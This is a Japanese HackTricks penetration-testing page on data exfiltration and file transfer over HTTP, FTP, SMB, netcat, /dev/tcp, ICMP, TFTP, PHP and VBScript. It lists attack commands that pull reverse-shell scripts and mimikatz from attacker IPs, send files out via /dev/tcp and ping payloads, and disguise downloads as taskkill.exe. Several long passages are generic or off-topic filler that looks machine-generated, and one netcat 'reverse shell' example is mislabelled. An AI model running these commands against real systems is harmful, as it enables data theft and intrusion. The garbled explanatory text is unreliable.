# 情報の外部流出

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できます。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリまで、クラウドシステムを含むテックスタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 情報を外部流出するための一般的にホワイトリストに登録されているドメイン

[https://lots-project.com/](https://lots-project.com/)をチェックして、悪用できる一般的にホワイトリストに登録されているドメインを見つけます。

## Base64のコピー＆ペースト

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

Windowsは、多くの組織で使用されている最も一般的なオペレーティングシステムの1つです。そのため、Windows環境での情報の外部への漏洩は、ハッカーにとって非常に魅力的な攻撃目標となります。

以下に、Windows環境での情報の外部への漏洩に関連する一般的な手法とリソースをいくつか紹介します。

1. **データエクスフィルトレーション**: データエクスフィルトレーションは、攻撃者が機密データを外部のサーバーやストレージに転送する手法です。これには、以下のような手法があります。

   - **コマンドラインツール**: Windowsには、データを外部に送信するためのコマンドラインツールがいくつか用意されています。例えば、`ftp`コマンドを使用してファイルをFTPサーバーにアップロードすることができます。

   - **リモートデスクトップ**: リモートデスクトップ接続を使用すると、攻撃者はリモートのWindowsマシンにアクセスし、データを転送することができます。

   - **クラウドストレージ**: クラウドストレージプラットフォーム（例：Google Drive、Dropbox）を使用すると、攻撃者はデータをクラウド上にアップロードし、外部からアクセスできるようにすることができます。

2. **ネットワークトラフィックの監視**: ネットワークトラフィックの監視は、攻撃者がデータを外部に送信する際に使用される通信プロトコルやポートを特定するために行われます。これには、以下のような手法があります。

   - **パケットキャプチャ**: パケットキャプチャツールを使用すると、ネットワーク上の通信を監視し、データの送信元や送信先を特定することができます。

   - **ファイアウォールログの分析**: ファイアウォールログを分析することで、攻撃者が使用するポートやプロトコルを特定することができます。

3. **データ暗号化**: データ暗号化は、攻撃者がデータを盗み見ることを困難にするために使用されます。以下の手法が一般的に使用されます。

   - **ファイル暗号化**: ファイルを暗号化することで、攻撃者がデータを読み取ることを防ぐことができます。

   - **通信暗号化**: ネットワーク上の通信を暗号化することで、攻撃者がデータを傍受することを防ぐことができます。

これらの手法とリソースを使用することで、Windows環境での情報の外部への漏洩を防ぐことができます。ただし、常に最新のセキュリティ対策を実施し、定期的な監視とアップデートを行うことが重要です。
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

Windowsは、多くの組織で使用されている最も一般的なオペレーティングシステムの1つです。そのため、Windows環境での情報の盗み出しは、ハッカーにとって非常に魅力的なターゲットです。

以下に、Windows環境での情報の盗み出しに使用される一般的な手法とリソースをいくつか紹介します。

1. **USBデバイスの使用**: ハッカーは、USBデバイスを使用してデータを盗み出すことができます。これには、USBフラッシュドライブや外部ハードドライブ、さらにはキーロガーなどの特殊なデバイスも含まれます。

2. **ネットワーク経由のデータ転送**: ハッカーは、Windowsマシンから外部のサーバーにデータを転送するために、ネットワークを利用することができます。これには、一般的なプロトコル（HTTP、FTP、SMTPなど）やカスタムプロトコルを使用することができます。

3. **クラウドストレージの利用**: ハッカーは、Windowsマシンからクラウドストレージプラットフォーム（例：Google Drive、Dropbox、OneDriveなど）にデータをアップロードすることができます。これにより、データの盗み出しやバックアップが容易になります。

4. **電子メールの使用**: ハッカーは、Windowsマシンから電子メールを使用してデータを送信することができます。これには、添付ファイルやリンクを含めることができます。

5. **リモートアクセスツールの使用**: ハッカーは、リモートアクセスツールを使用してWindowsマシンにアクセスし、データを盗み出すことができます。これには、リモートデスクトッププロトコル（RDP）やリモートコントロールソフトウェアなどが含まれます。

これらの手法とリソースは、ハッカーがWindows環境で情報を盗み出すために使用する一般的な方法です。組織は、これらの攻撃からデータを保護するために、適切なセキュリティ対策を講じる必要があります。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### ファイルのアップロード

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServerでGETとPOSTを表示する（ヘッダーも）**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Pythonモジュール[uploadserver](https://pypi.org/project/uploadserver/)：
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPSサーバー**

An HTTPS server is a type of server that uses the HTTPS (Hypertext Transfer Protocol Secure) protocol to secure the communication between the server and the client. It provides encryption and authentication mechanisms to ensure that the data transmitted between the server and the client is secure and cannot be intercepted or tampered with by unauthorized parties.

HTTPS servers are commonly used for websites that handle sensitive information, such as login credentials, financial transactions, and personal data. By using HTTPS, the server can protect the confidentiality and integrity of the data being transmitted.

To set up an HTTPS server, you need to obtain an SSL/TLS certificate from a trusted certificate authority (CA). This certificate is used to verify the identity of the server and establish a secure connection with the client. Once the certificate is installed on the server, it can start accepting HTTPS connections.

When a client connects to an HTTPS server, the server presents its SSL/TLS certificate to the client. The client then verifies the authenticity of the certificate and establishes a secure connection with the server. All data transmitted between the client and the server is encrypted using the SSL/TLS protocol, ensuring that it cannot be read or modified by attackers.

In addition to encryption, HTTPS servers also provide other security features, such as server-side validation of client certificates, which can be used to authenticate clients. This helps prevent unauthorized access to the server and ensures that only trusted clients can establish a connection.

Overall, HTTPS servers play a crucial role in securing the communication between clients and servers, protecting sensitive data from unauthorized access or tampering. By using HTTPS, organizations can ensure the privacy and integrity of their users' data and build trust with their customers.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTPサーバー（Python）

```python
import ftplib

def ftp_upload(file_path, host, username, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(username, password)
        with open(file_path, 'rb') as file:
            ftp.storbinary('STOR ' + file_path, file)
        ftp.quit()
        print('File uploaded successfully.')
    except ftplib.all_errors as e:
        print('Error uploading file:', e)
```

このPythonスクリプトは、指定されたファイルをFTPサーバーにアップロードするためのものです。

使用方法：

```python
ftp_upload('/path/to/file', 'ftp.example.com', 'username', 'password')
```

- `file_path`：アップロードするファイルのパス
- `host`：FTPサーバーのホスト名
- `username`：FTPサーバーのユーザー名
- `password`：FTPサーバーのパスワード

アップロードが成功すると、"File uploaded successfully."と表示されます。アップロード中にエラーが発生した場合は、"Error uploading file:"とエラーメッセージが表示されます。
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTPサーバー（NodeJS）

The FTP server is a popular method for transferring files between a client and a server. It uses the File Transfer Protocol (FTP) to establish a connection and exchange files. In this section, we will explore how to set up an FTP server using NodeJS.

#### Setting up the FTP server

To set up an FTP server using NodeJS, we can use the `ftp-srv` package. This package provides a simple and easy-to-use interface for creating an FTP server.

First, we need to install the `ftp-srv` package by running the following command:

```bash
npm install ftp-srv
```

Once the package is installed, we can create an FTP server by creating a new instance of the `FtpSrv` class and passing in the server options. Here is an example:

```javascript
const FtpSrv = require('ftp-srv');

const server = new FtpSrv({
  url: 'ftp://127.0.0.1:21',
  pasv_url: 'ftp://127.0.0.1:3000',
  pasv_min: 3001,
  pasv_max: 3010,
  anonymous: true,
  greeting: 'Welcome to the FTP server!',
});

server.on('login', ({ connection, username, password }, resolve, reject) => {
  if (username === 'anonymous' && password === '') {
    resolve({ root: '/path/to/ftp/root' });
  } else {
    reject(new Error('Invalid username or password'));
  }
});

server.listen()
  .then(() => {
    console.log('FTP server started');
  })
  .catch((error) => {
    console.error('Failed to start FTP server:', error);
  });
```

In the example above, we create a new instance of the `FtpSrv` class and pass in the server options. The `url` option specifies the FTP server URL, while the `pasv_url`, `pasv_min`, and `pasv_max` options specify the passive mode settings. The `anonymous` option allows anonymous login, and the `greeting` option sets the welcome message.

We also listen for the `login` event, which is triggered when a client attempts to log in. In the event handler, we check the username and password and either resolve or reject the login attempt.

Finally, we call the `listen` method to start the FTP server. If the server starts successfully, the `listen` method returns a promise that resolves when the server is ready to accept connections.

#### Connecting to the FTP server

Once the FTP server is set up and running, clients can connect to it using an FTP client. They can use the server URL, username, and password to establish a connection.

Here is an example of connecting to the FTP server using the `ftp` command-line client:

```bash
ftp 127.0.0.1
```

After connecting, clients can use various FTP commands to interact with the server, such as `ls` to list files, `get` to download files, and `put` to upload files.

#### Conclusion

Setting up an FTP server using NodeJS is a straightforward process. By using the `ftp-srv` package, we can quickly create an FTP server and handle client connections. This allows us to easily transfer files between a client and a server using the FTP protocol.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTPサーバー（pure-ftp）

FTPサーバーは、ファイル転送プロトコル（FTP）を使用してファイルを送受信するためのサーバーです。pure-ftpは、オープンソースのFTPサーバーソフトウェアの一種です。

#### 概要

pure-ftpサーバーは、セキュリティとパフォーマンスに優れた特徴を持っています。以下は、pure-ftpサーバーの主な特徴です。

- TLS/SSLサポート：データの暗号化とセキュアな通信を提供します。
- 仮想ユーザー：ユーザーを仮想的に作成し、アクセス権を制御します。
- バンド幅制限：ユーザーごとに帯域幅を制限することができます。
- アクセス制御：ユーザーごとにアクセス権を制御することができます。
- ログ記録：アクセスログや転送ログを記録することができます。

#### 漏洩の可能性

pure-ftpサーバーは、セキュリティ機能が備わっているため、データの漏洩リスクは低いです。ただし、以下のような脆弱性や設定ミスにより、漏洩の可能性が生じることがあります。

- 弱いパスワード：弱いパスワードを使用している場合、攻撃者によってアカウントが乗っ取られる可能性があります。
- 不正なアクセス権：誤ったアクセス権の設定により、攻撃者が不正なファイルにアクセスできる可能性があります。
- セキュリティパッチの欠如：最新のセキュリティパッチが適用されていない場合、既知の脆弱性を悪用される可能性があります。

#### 漏洩の防止策

pure-ftpサーバーでの漏洩を防止するためには、以下の対策を実施することが重要です。

- 強力なパスワードの使用：パスワードは長く複雑なものを使用し、定期的に変更するようにします。
- アクセス権の適切な設定：ユーザーごとに必要な最小限のアクセス権を設定し、不要な権限を削除します。
- セキュリティパッチの適用：最新のセキュリティパッチを適用し、脆弱性を修正します。
- ログの監視：アクセスログや転送ログを監視し、不審なアクティビティを検知します。

以上が、pure-ftpサーバーに関する概要と漏洩の可能性、漏洩の防止策です。
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** クライアント

Windowsクライアントは、機密データの外部への漏洩のリスクにさらされています。攻撃者は、さまざまな手法を使用してデータを盗み出すことができます。以下に、一般的な手法とリソースを示します。

#### ネットワーク経由のデータ漏洩

- **データエクスフィルトレーション**：攻撃者は、ネットワークを介してデータを外部に送信することができます。これには、メール、ファイル転送、リモートアクセスツールなどが含まれます。

#### ストレージデバイスを介したデータ漏洩

- **USBデバイス**：攻撃者は、USBデバイスを使用してデータを盗み出すことができます。これには、USBフラッシュドライブ、外部ハードドライブ、およびその他のリムーバブルメディアが含まれます。

#### クラウドベースのデータ漏洩

- **クラウドストレージ**：攻撃者は、クラウドストレージサービスを使用してデータを外部に送信することができます。これには、Googleドライブ、Dropbox、OneDriveなどが含まれます。

#### ネットワークトラフィックの監視

- **パケットキャプチャ**：攻撃者は、ネットワークトラフィックを監視してデータをキャプチャすることができます。これには、ネットワークスニッファ、パケットキャプチャツールなどが含まれます。

#### セキュリティ対策の回避

- **ファイアウォール回避**：攻撃者は、ファイアウォールを回避してデータを外部に送信することができます。これには、トンネリング、ポートハッピング、パケットの分割などが含まれます。

これらの攻撃手法を防ぐためには、適切なセキュリティ対策を実施する必要があります。これには、ファイアウォール、侵入検知システム、データ暗号化、アクセス制御などが含まれます。また、従業員の教育と意識向上も重要です。
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは、攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kaliをサーバーとして使用
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
または、Sambaを使用してSMB共有を作成します：
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# データの外部流出

データの外部流出は、ハッカーが機密情報を不正に取得し、外部の場所に送信するプロセスです。この技術は、悪意のある攻撃者が組織のデータを盗むために使用することがあります。データの外部流出は、さまざまな方法で実行することができます。

## メールを介したデータの外部流出

ハッカーは、電子メールを使用してデータを外部に送信することができます。悪意のある攻撃者は、組織のネットワークに侵入し、機密情報を電子メールの添付ファイルとして送信することがあります。また、ハッカーは、組織の電子メールサーバーにアクセスし、メールの送信を制御することもできます。

## クラウドストレージを介したデータの外部流出

ハッカーは、クラウドストレージサービスを使用してデータを外部に送信することもあります。悪意のある攻撃者は、組織のクラウドストレージアカウントに侵入し、機密情報をアップロードすることができます。また、ハッカーは、組織のクラウドストレージサービスにアクセスし、データのダウンロードや共有を制御することもできます。

## リムーバブルメディアを介したデータの外部流出

ハッカーは、リムーバブルメディア（USBフラッシュドライブ、外部ハードドライブなど）を使用してデータを外部に持ち出すこともあります。悪意のある攻撃者は、組織のネットワークに侵入し、機密情報をリムーバブルメディアにコピーすることができます。また、ハッカーは、組織のコンピュータにリムーバブルメディアを接続し、データの転送を制御することもできます。

## ネットワークを介したデータの外部流出

ハッカーは、ネットワークを介してデータを外部に送信することもあります。悪意のある攻撃者は、組織のネットワークに侵入し、機密情報を外部のサーバーに送信することができます。また、ハッカーは、組織のネットワークトラフィックを監視し、データの転送を制御することもできます。

## データの外部流出の検出と防止

データの外部流出を検出し、防止するためには、組織は適切なセキュリティ対策を実施する必要があります。これには、ファイアウォール、侵入検知システム、データ損失防止ソフトウェアなどのセキュリティツールの使用が含まれます。また、組織は従業員の教育と意識向上を行い、機密情報の取り扱いに関するポリシーを策定することも重要です。
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

攻撃者はSSHdを実行している必要があります。
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

もし被害者がSSHを持っている場合、攻撃者は被害者から自分自身にディレクトリをマウントすることができます。
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC（Netcat）は、ネットワークユーティリティであり、データの送受信に使用されます。NCを使用してデータを外部に送信するためのいくつかの方法があります。

### ネットワーク経由のデータ送信

NCを使用してデータを外部に送信するために、以下のコマンドを使用します。

```
echo [データ] | nc [宛先IPアドレス] [ポート番号]
```

このコマンドは、指定したデータを宛先IPアドレスとポート番号に送信します。

### ファイルの送信

NCを使用してファイルを外部に送信するために、以下のコマンドを使用します。

```
nc [宛先IPアドレス] [ポート番号] < [ファイル名]
```

このコマンドは、指定したファイルを宛先IPアドレスとポート番号に送信します。

### リバースシェル

リバースシェルは、攻撃者がターゲットシステムに接続し、コマンドを実行するための方法です。NCを使用してリバースシェルを作成するために、以下のコマンドを使用します。

```
nc -l -p [ポート番号] -e /bin/bash
```

このコマンドは、指定したポート番号でリバースシェルを作成し、/bin/bashを実行します。

これらの方法を使用して、NCを介してデータを外部に送信することができます。ただし、これらの方法は合法的な目的のためにのみ使用するようにしてください。
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
```bash
cat /path/to/file > /dev/tcp/<attacker_ip>/<attacker_port>
```

この方法では、攻撃者は `/dev/tcp/<attacker_ip>/<attacker_port>` にファイルをダウンロードします。
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### ファイルを被害者にアップロードする

攻撃者が被害者のシステムにファイルをアップロードすることは、情報の窃取や悪意のある目的のために重要な手法です。以下に、ファイルを被害者にアップロードするための一般的な手法とリソースを示します。

1. ファイル共有サービスの悪用: 被害者が利用しているファイル共有サービス（Dropbox、Google ドライブなど）の脆弱性を悪用して、攻撃者がファイルをアップロードすることができます。これには、脆弱性のあるアップロード機能や認証の欠陥を利用する方法があります。

2. ウェブアプリケーションの脆弱性: 被害者が利用しているウェブアプリケーションに存在する脆弱性を悪用して、攻撃者がファイルをアップロードすることができます。例えば、ファイルアップロード機能における不正なファイルタイプの許可や、ファイルのアップロード先のディレクトリの制限が不十分な場合などです。

3. メールの添付ファイル: 攻撃者は、被害者に対して悪意のあるメールを送信し、そのメールに添付されたファイルをアップロードするように誘導することがあります。これには、ソーシャルエンジニアリングの手法を使用することがあります。

4. リモートコード実行: 攻撃者は、被害者のシステムにリモートコード実行の脆弱性が存在する場合、その脆弱性を悪用してファイルをアップロードすることができます。これには、ウェブアプリケーションやネットワークデバイスにおける脆弱性を利用する方法があります。

攻撃者がファイルを被害者にアップロードするためには、様々な手法とリソースが利用されます。攻撃者は、これらの手法を理解し、適切な脆弱性を悪用することで、ファイルのアップロードを実現します。
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

ICMP（Internet Control Message Protocol）は、ネットワークデバイス間で制御メッセージを送受信するためのプロトコルです。ICMPは、ネットワークの状態やエラーの通知、ネットワークデバイスの可用性の確認など、さまざまな目的で使用されます。

ICMPは、データグラムの形式で送信され、IPヘッダの一部として含まれます。ICMPメッセージは、送信元から宛先までの経路上のネットワークデバイスによって処理されます。

ICMPメッセージは、さまざまなタイプとコードで識別されます。一般的なICMPメッセージには、エコーリクエスト（ping）やエコーリプライ（ping応答）などがあります。

ICMPは、ネットワークのトラブルシューティングやネットワークデバイスの可用性の確認に役立ちます。また、ICMPを利用して情報をエクスフィルトすることも可能です。

ICMPエクスフィルトは、ネットワーク上のデータをICMPメッセージに埋め込んで送信する方法です。この方法を使用すると、ネットワークのファイアウォールやセキュリティシステムを回避してデータを外部に送信することができます。

ICMPエクスフィルトは、データの転送速度が低いため、大量のデータを送信する場合には適していません。しかし、小さなデータセットやコマンドの実行結果など、比較的小さなデータを送信する場合には有用です。

ICMPエクスフィルトを実行するためには、ICMPパケットを生成し、データをパケットに埋め込む必要があります。また、送信元と宛先のIPアドレスを指定する必要があります。

ICMPエクスフィルトは、ネットワークの可用性やセキュリティに影響を与える可能性があるため、適切な許可を得て実行する必要があります。また、ICMPエクスフィルトを検知するためのセキュリティ対策も必要です。
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

SMTPサーバーにデータを送信できれば、Pythonを使用してデータを受信するSMTPを作成できます。
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

デフォルトではXPと2003（他の場合はインストール時に明示的に追加する必要があります）

Kaliでは、**TFTPサーバーを起動**します：
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**PythonでのTFTPサーバー：**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        # Receive the request packet
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        # Check if it is a read request (RRQ)
        if opcode == 1:
            # Extract the filename from the request packet
            filename = data[2:data.index(b'\x00')].decode('utf-8')

            # Open the file in binary mode
            try:
                file = open(filename, 'rb')
                block_number = 1
                block_data = file.read(512)

                while block_data:
                    # Create the data packet
                    data_packet = struct.pack('!HH', 3, block_number) + block_data

                    # Send the data packet to the client
                    server_socket.sendto(data_packet, client_address)

                    # Receive the acknowledgement packet
                    ack_packet, client_address = server_socket.recvfrom(4)
                    ack_opcode = struct.unpack('!H', ack_packet[:2])[0]
                    ack_block_number = struct.unpack('!H', ack_packet[2:])[0]

                    # Check if the acknowledgement packet is valid
                    if ack_opcode != 4 or ack_block_number != block_number:
                        break

                    # Read the next block of data
                    block_number += 1
                    block_data = file.read(512)

                # Close the file
                file.close()

            except FileNotFoundError:
                # Send an error packet if the file is not found
                error_packet = struct.pack('!HH', 5, 1) + b'File not found'
                server_socket.sendto(error_packet, client_address)

        # Check if it is a write request (WRQ)
        elif opcode == 2:
            # Send an error packet indicating that write requests are not supported
            error_packet = struct.pack('!HH', 5, 4) + b'Write requests are not supported'
            server_socket.sendto(error_packet, client_address)

    # Close the server socket
    server_socket.close()

# Start the TFTP server
tftp_server()
```

このコードはPythonでTFTPサーバーを作成するものです。以下の手順で動作します。

1. UDPソケットを作成します。
2. ソケットをIPアドレス0.0.0.0、ポート番号69にバインドします。
3. リクエストパケットを受信します。
4. リクエストのオペコードを確認し、読み取りリクエスト（RRQ）か書き込みリクエスト（WRQ）かを判断します。
5. 読み取りリクエストの場合、リクエストパケットからファイル名を抽出します。
6. ファイルをバイナリモードで開きます。
7. ファイルから512バイトのデータを読み取り、データパケットを作成してクライアントに送信します。
8. 確認パケットを受信し、パケットが正当かどうかを確認します。
9. 次のデータブロックを読み取り、手順7-8を繰り返します。
10. ファイルの終わりに達した場合、ファイルを閉じます。
11. ファイルが見つからない場合、エラーパケットを送信します。
12. 書き込みリクエストの場合、エラーパケットを送信します。
13. サーバーソケットを閉じます。

TFTPサーバーは、TFTPクライアントからの読み取りリクエストに応答し、要求されたファイルを送信します。ただし、書き込みリクエストには対応していません。
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**被害者**で、Kaliサーバーに接続します：
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

PHPのワンライナーを使用してファイルをダウンロードします：
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript（Visual Basic Scripting Edition）は、Microsoftが開発したスクリプト言語です。VBScriptは、Windows環境で広く使用されており、システム管理や自動化のためのスクリプト作成に適しています。

VBScriptを使用してデータを外部に送信する方法はいくつかあります。以下にいくつかの一般的な方法を示します。

### ファイル転送

VBScriptを使用してファイルを外部に転送するには、`FileSystemObject`オブジェクトを使用します。このオブジェクトを使用すると、ファイルの読み取りや書き込み、ファイルのコピーなどの操作が可能です。外部のサーバーにファイルをアップロードする場合は、FTPプロトコルを使用することが一般的です。

以下は、VBScriptを使用してファイルをFTPサーバーにアップロードする例です。

```vbscript
Set objFTP = CreateObject("WinSCP.Session")
objFTP.Open "ftp://username:password@ftp.example.com"
objFTP.PutFile "C:\path\to\file.txt", "/remote/path/file.txt"
objFTP.Close
```

### ネットワーク経由のデータ送信

VBScriptを使用してネットワーク経由でデータを送信するには、`WinHttp.WinHttpRequest`オブジェクトを使用します。このオブジェクトを使用すると、HTTPリクエストを送信し、データを外部のサーバーに送信することができます。

以下は、VBScriptを使用してデータを外部のサーバーに送信する例です。

```vbscript
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objHTTP.Open "POST", "http://example.com/endpoint", False
objHTTP.setRequestHeader "Content-Type", "application/json"
objHTTP.Send "{""data"": ""example data""}"
```

### 電子メール経由のデータ送信

VBScriptを使用して電子メール経由でデータを送信するには、`CDO.Message`オブジェクトを使用します。このオブジェクトを使用すると、SMTPサーバーを介して電子メールを送信することができます。

以下は、VBScriptを使用して電子メールを送信する例です。

```vbscript
Set objEmail = CreateObject("CDO.Message")
objEmail.From = "sender@example.com"
objEmail.To = "recipient@example.com"
objEmail.Subject = "Example Subject"
objEmail.TextBody = "Example Body"
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.example.com"
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objEmail.Configuration.Fields.Update
objEmail.Send
```

これらは、VBScriptを使用してデータを外部に送信する一般的な方法のいくつかです。ただし、これらの方法を使用する場合は、セキュリティ上の注意が必要です。データの送信先や送信されるデータの内容を慎重に検討し、適切なセキュリティ対策を講じることが重要です。
```bash
Attacker> python -m SimpleHTTPServer 80
```
**被害者**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
